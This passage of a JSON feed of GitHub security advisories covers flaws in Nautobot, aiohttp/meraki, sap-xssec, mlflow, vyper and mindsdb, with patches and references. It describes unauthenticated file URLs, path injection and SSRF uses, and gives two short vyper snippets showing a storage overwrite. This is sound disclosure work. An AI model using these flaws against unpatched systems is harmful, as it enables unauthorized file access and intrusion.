            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p> In Nautobot 1.x and 2.0.x, the URLs <code>/files/get/?name=...</code> and <code>/files/download/?name=...</code> are used to provide admin access to files that have been uploaded as part of a run request for a Job that has FileVar inputs. Under normal operation these files are ephemeral and are deleted once the Job in question runs. </p>\n<p>It was reported by @kircheneer that in the default implementation used in Nautobot, as provided by <code>django-db-file-storage</code>, these URLs do not by default require any user authentication to access; they should instead be restricted to only users who have permissions to view Nautobot's <code>FileProxy</code> model instances.</p>\n<p>Note that no URL mechanism is provided for listing or traversal of the available file <code>name</code> values, so in practice an unauthenticated user would have to guess names to discover arbitrary files for download, but if a user knows the file name/path value, they can access it without authenticating, so we are considering this a vulnerability.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Fixes will be included in Nautobot 1.6.7 and Nautobot 2.0.6.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workaround other than applying the patches included in <a href=\"https://github.com/nautobot/nautobot/pull/4959/files\">https://github.com/nautobot/nautobot/pull/4959/files</a> (2.0.x) or <a href=\"https://github.com/nautobot/nautobot/pull/4964/files\">https://github.com/nautobot/nautobot/pull/4964/files</a> (1.6.x)</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/victor-o-silva/db_file_storage/blob/master/db_file_storage/views.py\">https://github.com/victor-o-silva/db_file_storage/blob/master/db_file_storage/views.py</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nautobot/nautobot/security/advisories/GHSA-75mc-3pjc-727q\">https://github.com/nautobot/nautobot/security/advisories/GHSA-75mc-3pjc-727q</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-50263\">https://nvd.nist.gov/vuln/detail/CVE-2023-50263</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4959\">https://github.com/nautobot/nautobot/pull/4959</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/pull/4964\">https://github.com/nautobot/nautobot/pull/4964</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/458280c359a4833a20da294eaf4b8d55edc91cee\">https://github.com/nautobot/nautobot/commit/458280c359a4833a20da294eaf4b8d55edc91cee</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/5e2ba9e8ac0840b1c44eb1a8ea3c0bd2c68e4f80\">https://github.com/nautobot/nautobot/commit/5e2ba9e8ac0840b1c44eb1a8ea3c0bd2c68e4f80</a></li>\n<li><a href=\"https://github.com/nautobot/nautobot/commit/7c4cf3137f45f1541f09f2f6a7f8850cd3a2eaee\">https://github.com/nautobot/nautobot/commit/7c4cf3137f45f1541f09f2f6a7f8850cd3a2eaee</a></li>\n<li><a href=\"https://github.com/victor-o-silva/db_file_storage/blob/master/db_file_storage/views.py\">https://github.com/victor-o-silva/db_file_storage/blob/master/db_file_storage/views.py</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-75mc-3pjc-727q\">https://github.com/advisories/GHSA-75mc-3pjc-727q</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-75mc-3pjc-727q",
            "title": "[nautobot] Unauthenticated db-file-storage views",
            "date_modified": "2023-12-18T18:37:48.000Z",
            "date_published": "2023-12-13T13:35:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-75mc-3pjc-727q"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>aiohttp is an asynchronous HTTP client/server framework for asyncio and Python. Improper validation made it possible for an attacker to modify the HTTP request (e.g. to insert a new header) or create a new HTTP request if the attacker controls the HTTP version. The vulnerability only occurs if the attacker can control the HTTP version of the request. This issue has been patched in version 3.9.0.</p>\n<p>meraki from version 1.40.1 requires aiohttp 3.9.0</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/meraki/dashboard-api-python/security/advisories/GHSA-6x4h-9622-fqr6\">https://github.com/meraki/dashboard-api-python/security/advisories/GHSA-6x4h-9622-fqr6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49081\">https://nvd.nist.gov/vuln/detail/CVE-2023-49081</a></li>\n<li><a href=\"https://github.com/meraki/dashboard-api-python/releases/tag/1.40.1\">https://github.com/meraki/dashboard-api-python/releases/tag/1.40.1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6x4h-9622-fqr6\">https://github.com/advisories/GHSA-6x4h-9622-fqr6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6x4h-9622-fqr6",
            "title": "[meraki] Improper validation in meraki",
            "date_modified": "2023-12-13T13:35:17.000Z",
            "date_published": "2023-12-13T13:35:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6x4h-9622-fqr6"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>SAP BTP Security Services Integration Library ([Python] sap-xssec) allows under certain conditions an escalation of privileges. On successful exploitation, an unauthenticated attacker can obtain arbitrary permissions within the application.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Upgrade to patched version &gt;= 4.1.0\nWe always recommend to upgrade to the latest released version.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workarounds</p>\n<h3 id=\"references\">References</h3>\n<p><a href=\"https://www.cve.org/CVERecord?id=CVE-2023-50423\">https://www.cve.org/CVERecord?id=CVE-2023-50423</a></p>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/SAP/cloud-pysec/security/advisories/GHSA-6mjg-37cp-42x5\">https://github.com/SAP/cloud-pysec/security/advisories/GHSA-6mjg-37cp-42x5</a></li>\n<li><a href=\"https://github.com/SAP/cloud-pysec/commit/d90c9e0733fa9af68bd8ea0b1cf023cf482163ef\">https://github.com/SAP/cloud-pysec/commit/d90c9e0733fa9af68bd8ea0b1cf023cf482163ef</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6mjg-37cp-42x5\">https://github.com/advisories/GHSA-6mjg-37cp-42x5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6mjg-37cp-42x5",
            "title": "[sap-xssec] Improper Privilege Management in sap-xssec",
            "date_modified": "2023-12-13T13:34:41.000Z",
            "date_published": "2023-12-13T13:34:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6mjg-37cp-42x5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Improper Neutralization of Special Elements Used in a Template Engine in GitHub repository mlflow/mlflow prior to 2.9.2.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6709\">https://nvd.nist.gov/vuln/detail/CVE-2023-6709</a></li>\n<li><a href=\"https://github.com/mlflow/mlflow/commit/432b8ccf27fd3a76df4ba79bb1bec62118a85625\">https://github.com/mlflow/mlflow/commit/432b8ccf27fd3a76df4ba79bb1bec62118a85625</a></li>\n<li><a href=\"https://huntr.com/bounties/9e4cc07b-6fff-421b-89bd-9445ef61d34d\">https://huntr.com/bounties/9e4cc07b-6fff-421b-89bd-9445ef61d34d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-cxfr-5q3r-2rc2\">https://github.com/advisories/GHSA-cxfr-5q3r-2rc2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-cxfr-5q3r-2rc2",
            "title": "[mlflow] Jinja2 template injection in mlflow",
            "date_modified": "2023-12-13T13:33:31.000Z",
            "date_published": "2023-12-12T06:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-cxfr-5q3r-2rc2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>contracts containing large arrays might underallocate the number of slots they need. prior to v0.3.8, the calculation to determine how many slots a storage variable needed used <code>math.ceil(type_.size_in_bytes / 32)</code>:</p>\n<p><a href=\"https://github.com/vyperlang/vyper/blob/6020b8bbf66b062d299d87bc7e4eddc4c9d1c157/vyper/semantics/validation/data_positions.py#L197\">https://github.com/vyperlang/vyper/blob/6020b8bbf66b062d299d87bc7e4eddc4c9d1c157/vyper/semantics/validation/data_positions.py#L197</a></p>\n<p>the intermediate floating point step can produce a rounding error if there are enough bits set in the IEEE-754 mantissa. roughly speaking, if <code>type_.size_in_bytes</code> is large (&gt; 2**46), and slightly less than a power of 2, the calculation can overestimate how many slots are needed. if <code>type_.size_in_bytes</code> is slightly more than a power of 2, the calculation can underestimate how many slots are needed.</p>\n<p>the following two example contracts can result in overwriting of the variable <code>vulnerable</code>:</p>\n<pre><code class=\"language-vyper\">large_array: address[2**64 + 1]  # type_.size_in_bytes == 32 * (2**64 + 1); math.ceil(type_.size_in_bytes / 32) &lt; 2**64 + 1\nvulnerable: uint256\n\n# writing to self.large_array[2**64] will overwrite self.vulnerable\n</code></pre>\n<pre><code class=\"language-vyper\">large_dynarray: DynArray[address, 2**64]  # Dynarray has a length word in front, its size in bytes is 32 * (2**64 + 1)\nvulnerable: uint256\n\n# writing to self.large_dynarray[2**64 - 1] will overwrite self.vulnerable\n</code></pre>\n<p>note that in the latter case, the risk of <code>vulnerable</code> being overwritten is relatively small, since it would cost roughly $1.45 million trillion USD at today's gas prices (gas price 20gwei, ETH ~= $1800) in order to extend the DynArray to its full container size.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>patched by v0.3.8, specifically in commit <a href=\"https://github.com/vyperlang/vyper/commit/0bb7203b584e771b23536ba065a6efda457161bb\">https://github.com/vyperlang/vyper/commit/0bb7203b584e771b23536ba065a6efda457161bb</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vyperlang/vyper/security/advisories/GHSA-6m97-7527-mh74\">https://github.com/vyperlang/vyper/security/advisories/GHSA-6m97-7527-mh74</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-46247\">https://nvd.nist.gov/vuln/detail/CVE-2023-46247</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/commit/0bb7203b584e771b23536ba065a6efda457161bb\">https://github.com/vyperlang/vyper/commit/0bb7203b584e771b23536ba065a6efda457161bb</a></li>\n<li><a href=\"https://github.com/vyperlang/vyper/blob/6020b8bbf66b062d299d87bc7e4eddc4c9d1c157/vyper/semantics/validation/data_positions.py#L197\">https://github.com/vyperlang/vyper/blob/6020b8bbf66b062d299d87bc7e4eddc4c9d1c157/vyper/semantics/validation/data_positions.py#L197</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6m97-7527-mh74\">https://github.com/advisories/GHSA-6m97-7527-mh74</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6m97-7527-mh74",
            "title": "[vyper] incorrect storage layout for contracts containing large arrays",
            "date_modified": "2023-12-13T21:33:33.000Z",
            "date_published": "2023-12-13T13:18:52.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6m97-7527-mh74"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Cross-site Scripting (XSS) - Reflected in GitHub repository mlflow/mlflow prior to 2.9.0.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-6568\">https://nvd.nist.gov/vuln/detail/CVE-2023-6568</a></li>\n<li><a href=\"https://github.com/mlflow/mlflow/commit/28ff3f94994941e038f2172c6484b65dc4db6ca1\">https://github.com/mlflow/mlflow/commit/28ff3f94994941e038f2172c6484b65dc4db6ca1</a></li>\n<li><a href=\"https://huntr.com/bounties/816bdaaa-8153-4732-951e-b0d92fddf709\">https://huntr.com/bounties/816bdaaa-8153-4732-951e-b0d92fddf709</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vwhf-3v6x-wff8\">https://github.com/advisories/GHSA-vwhf-3v6x-wff8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vwhf-3v6x-wff8",
            "title": "[mlflow] Cross-site Scripting in MLflow",
            "date_modified": "2023-12-12T00:57:44.000Z",
            "date_published": "2023-12-07T06:30:21.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vwhf-3v6x-wff8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The put method in <code>mindsdb/mindsdb/api/http/namespaces/file.py</code> does not validate the user-controlled <code>name</code> value, which is used in a temporary file name, which is afterwards opened for writing on lines 122-125, which leads to path injection. This issue may lead to arbitrary file write. This vulnerability allows for writing files anywhere on the server that the filesystem permissions that the running server has access to.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Use mindsdb staging branch or v23.11.4.1</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GHSL-2023-184 </li>\n<li>See <a href=\"https://codeql.github.com/codeql-query-help/python/py-path-injection/\">CodeQL path injection prevention guidelines</a> and <a href=\"https://owasp.org/www-community/attacks/Path_Traversal\">OWASP guidelines</a>.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mindsdb/mindsdb/security/advisories/GHSA-crhp-7c74-cg4c\">https://github.com/mindsdb/mindsdb/security/advisories/GHSA-crhp-7c74-cg4c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49796\">https://nvd.nist.gov/vuln/detail/CVE-2023-49796</a></li>\n<li><a href=\"https://github.com/mindsdb/mindsdb/commit/8d13c9c28ebcf3b36509eb679378004d4648d8fe\">https://github.com/mindsdb/mindsdb/commit/8d13c9c28ebcf3b36509eb679378004d4648d8fe</a></li>\n<li><a href=\"https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L122-L125\">https://github.com/mindsdb/mindsdb/blob/1821da719f34c022890c9ff25810218e71c5abbc/mindsdb/api/http/namespaces/file.py#L122-L125</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-crhp-7c74-cg4c\">https://github.com/advisories/GHSA-crhp-7c74-cg4c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-crhp-7c74-cg4c",
            "title": "[mindsdb] Improper Input Validation in mindsdb",
            "date_modified": "2023-12-12T00:49:01.000Z",
            "date_published": "2023-12-12T00:49:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-crhp-7c74-cg4c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The put method in <code>mindsdb/mindsdb/api/http/namespaces/file.py</code> does not validate the user-controlled URL in the source variable and uses it to create arbitrary requests on line 115, which allows Server-side request forgery (SSRF). This issue may lead to Information Disclosure. The SSRF allows for forging arbitrary network requests from the MindsDB server. It can be used to scan nodes in internal networks for open ports that may not be accessible externally, as well as scan for existing files on the internal network. It allows for retrieving files with csv, xls, xlsx, json or parquet extensions, which will be viewable via MindsDB GUI. For any other existing files, it is a blind SSRF.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Use mindsdb staging branch or v23.11.4.1</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>GHSL-2023-182\n<a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\">SSRF prevention cheatsheet</a>.</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mindsdb/mindsdb/security/advisories/GHSA-34mr-6q8x-g9r6\">https://github.com/mindsdb/mindsdb/security/advisories/GHSA-34mr-6q8x-g9r6</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2023-49795\">https://nvd.nist.gov/vuln/detail/CVE-2023-49795</a></li>\n<li><a href=\"https://github.com/mindsdb/mindsdb/commit/8d13c9c28ebcf3b36509eb679378004d4648d8fe\">https://github.com/mindsdb/mindsdb/commit/8d13c9c28ebcf3b36509eb679378004d4648d8fe</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-34mr-6q8x-g9r6\">https://github.com/advisories/GHSA-34mr-6q8x-g9r6</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-34mr-6q8x-g9r6",
            "title": "[mindsdb] Server-Side Request Forgery in mindsdb",
            "date_modified": "2023-12-12T00:48:48.000Z",
            "date_published": "2023-12-12T00:48:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-34mr-6q8x-g9r6"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}